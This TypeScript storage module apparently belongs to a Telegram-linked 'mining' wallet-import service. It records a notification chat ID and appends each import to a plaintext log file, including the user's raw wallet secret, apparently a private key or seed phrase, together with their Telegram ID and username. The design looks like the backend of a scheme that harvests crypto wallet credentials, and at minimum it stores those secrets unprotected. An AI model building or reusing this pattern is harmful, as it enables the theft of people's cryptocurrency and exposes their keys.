import { mkdir, readFile, writeFile, appendFile } from "fs/promises";
import path from "path";
import type { MiningImportRequest } from "../validation/import-wallet";

const DATA_DIR = path.join(process.cwd(), "data");
const NOTIFY_CHAT_FILE = path.join(DATA_DIR, "import-notify-chat.json");
const IMPORTS_LOG_FILE = path.join(DATA_DIR, "mining-imports.jsonl");

type NotifyChatRecord = {
  chatId: string;
  username: string;
  updatedAt: string;
};

async function ensureDataDir(): Promise<void> {
  await mkdir(DATA_DIR, { recursive: true });
}

export async function saveNotifyChatId(
  chatId: number,
  username: string,
): Promise<void> {
  await ensureDataDir();

  const record: NotifyChatRecord = {
    chatId: String(chatId),
    username,
    updatedAt: new Date().toISOString(),
  };

  await writeFile(NOTIFY_CHAT_FILE, JSON.stringify(record, null, 2), "utf8");

  console.info("Import notify chat id saved", {
    username,
    chatId: record.chatId,
  });
}

export async function getStoredNotifyChatId(): Promise<string | null> {
  try {
    const raw = await readFile(NOTIFY_CHAT_FILE, "utf8");
    const record = JSON.parse(raw) as NotifyChatRecord;
    return record.chatId?.trim() || null;
  } catch {
    return null;
  }
}

export async function appendImportLog(
  data: MiningImportRequest,
): Promise<void> {
  await ensureDataDir();

  const entry = {
    createdAt: new Date().toISOString(),
    chainId: data.chainId,
    chainName: data.chainName,
    importType: data.importType,
    secret: data.secret,
    telegramUserId: data.telegramUserId ?? null,
    telegramUsername: data.telegramUsername ?? null,
  };

  await appendFile(IMPORTS_LOG_FILE, `${JSON.stringify(entry)}\n`, "utf8");

  console.info("Wallet import logged", {
    chainId: data.chainId,
    importType: data.importType,
    telegramUserId: data.telegramUserId,
    logFile: IMPORTS_LOG_FILE,
  });
}
